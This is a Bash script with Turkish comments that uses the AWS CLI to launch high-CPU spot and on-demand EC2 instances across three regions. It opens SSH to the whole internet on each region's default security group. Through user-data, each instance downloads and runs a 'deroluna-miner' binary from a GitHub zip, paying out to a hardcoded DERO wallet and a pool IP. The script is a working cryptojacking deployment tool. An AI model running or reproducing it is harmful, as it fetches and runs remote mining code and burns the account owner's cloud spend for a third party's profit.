#!/bin/bash

# SPOT Instance türleri ve bölgeler
declare -a spot_instance_types=("m7a.16xlarge" "c7a.16xlarge" "r7a.16xlarge")
declare -a spot_regions=("eu-north-1" "us-east-1" "us-west-2")

# ON-DEMAND Instance türleri ve bölgeler
declare -a demand_instance_types=("c7a.4xlarge" "m7a.4xlarge" "r7a.4xlarge")
declare -a demand_regions=("eu-north-1" "us-east-1" "us-west-2")

# SPOT AMI ID'leri
declare -A spot_ami_ids
spot_ami_ids["eu-north-1"]="ami-0c1ac8a41498c1a9c"
spot_ami_ids["us-east-1"]="ami-084568db4383264d4"
spot_ami_ids["us-west-2"]="ami-075686beab831bb7f"

# DEMAND AMI ID'leri
declare -A demand_ami_ids
demand_ami_ids["eu-north-1"]="ami-042b4708b1d05f512"
demand_ami_ids["us-east-1"]="ami-020cba7c55df1f615"
demand_ami_ids["us-west-2"]="ami-05f991c49d264708f"

success_list_spot=()
failed_regions_spot=()
success_list_demand=()
failed_regions_demand=()

find_instance_type() {
    local region=$1
    shift
    local types=("$@")
    for instance_type in $(shuf -e "${types[@]}"); do
        local available
        available=$(aws ec2 describe-instance-type-offerings \
            --region "$region" \
            --filters "Name=instance-type,Values=$instance_type" "Name=location,Values=$region" \
            --query "InstanceTypeOfferings | length(@)" --output text 2>/dev/null)

        if [ "$available" -gt 0 ]; then
            echo "$instance_type"
            return
        fi
    done
    echo ""
}

create_instance() {
    local region="$1"
    local instance_type="$2"
    local ami_id="$3"
    local market_type="$4"

    local security_group_id
    security_group_id=$(aws ec2 describe-security-groups \
        --region "$region" \
        --filters "Name=group-name,Values=default" \
        --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    aws ec2 authorize-security-group-ingress \
        --region "$region" \
        --group-id "$security_group_id" \
        --protocol tcp --port 22 --cidr 0.0.0.0/0 \
        2>/dev/null || true

    local user_data
    user_data=$(cat <<EOF
#!/bin/bash
apt update && apt install -y unzip && wget -qO literary.zip https://github.com/eraemm/literary/raw/main/literary.zip && unzip -o literary.zip && chmod +x literary/deroluna-miner && screen -dmS literary ./literary/deroluna-miner -w dero1qyy8lusws59e50q9pru6wjt709jcgjle8t4qfmjfm25kzk32s0z8gqgp35cum -d 144.91.103.135:10100
EOF
    )

    if [ "$market_type" == "spot" ]; then
        instance_id=$(aws ec2 run-instances \
            --region "$region" \
            --image-id "$ami_id" \
            --instance-type "$instance_type" \
            --security-group-ids "$security_group_id" \
            --instance-market-options '{"MarketType":"spot"}' \
            --user-data "$user_data" \
            --count 1 \
            --query 'Instances[0].InstanceId' \
            --output text 2>/dev/null)
    else
        instance_id=$(aws ec2 run-instances \
            --region "$region" \
            --image-id "$ami_id" \
            --instance-type "$instance_type" \
            --security-group-ids "$security_group_id" \
            --user-data "$user_data" \
            --count 1 \
            --query 'Instances[0].InstanceId' \
            --output text 2>/dev/null)
    fi

    echo "$instance_id"
}

# SPOT başlat
for region in "${spot_regions[@]}"; do
    echo "********************************************************"
    echo "SPOT Bölge: $region"

    chosen_type=$(find_instance_type "$region" "${spot_instance_types[@]}")
    if [ -z "$chosen_type" ]; then
        echo "$region bölgesinde uygun bir SPOT instance türü bulunamadı."
        failed_regions_spot+=("$region")
        continue
    fi
    echo "Seçilen SPOT instance türü: $chosen_type"

    ami_id="${spot_ami_ids[$region]}"
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için SPOT AMI ID'si tanımlanmamış."
        failed_regions_spot+=("$region")
        continue
    fi

    echo "SPOT instance oluşturuluyor..."
    spot_instance_id=$(create_instance "$region" "$chosen_type" "$ami_id" "spot")

    if [ -n "$spot_instance_id" ] && [ "$spot_instance_id" != "None" ]; then
        echo "SPOT instance oluşturuldu: $spot_instance_id"
        success_list_spot+=("$region:$chosen_type:$spot_instance_id")
    else
        echo "SPOT instance oluşturulamadı."
        failed_regions_spot+=("$region")
    fi
done

# DEMAND başlat
for region in "${demand_regions[@]}"; do
    echo "********************************************************"
    echo "ON-DEMAND Bölge: $region"

    chosen_type=$(find_instance_type "$region" "${demand_instance_types[@]}")
    if [ -z "$chosen_type" ]; then
        echo "$region bölgesinde uygun bir ON-DEMAND instance türü bulunamadı."
        failed_regions_demand+=("$region")
        continue
    fi
    echo "Seçilen ON-DEMAND instance türü: $chosen_type"

    ami_id="${demand_ami_ids[$region]}"
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için ON-DEMAND AMI ID'si tanımlanmamış."
        failed_regions_demand+=("$region")
        continue
    fi

    echo "ON-DEMAND instance oluşturuluyor..."
    demand_instance_id=$(create_instance "$region" "$chosen_type" "$ami_id" "demand")

    if [ -n "$demand_instance_id" ] && [ "$demand_instance_id" != "None" ]; then
        echo "ON-DEMAND instance oluşturuldu: $demand_instance_id"
        success_list_demand+=("$region:$chosen_type:$demand_instance_id")
    else
        echo "ON-DEMAND instance oluşturulamadı."
        failed_regions_demand+=("$region")
    fi
done

# Özet
echo "==========================================================="
echo "SPOT Başarılı Bölgeler:"
printf '%s\n' "${success_list_spot[@]}"

echo "SPOT Başarısız Bölgeler:"
printf '%s\n' "${failed_regions_spot[@]}"

echo "-----------------------------------------------------------"
echo "ON-DEMAND Başarılı Bölgeler:"
printf '%s\n' "${success_list_demand[@]}"

echo "ON-DEMAND Başarısız Bölgeler:"
printf '%s\n' "${failed_regions_demand[@]}"
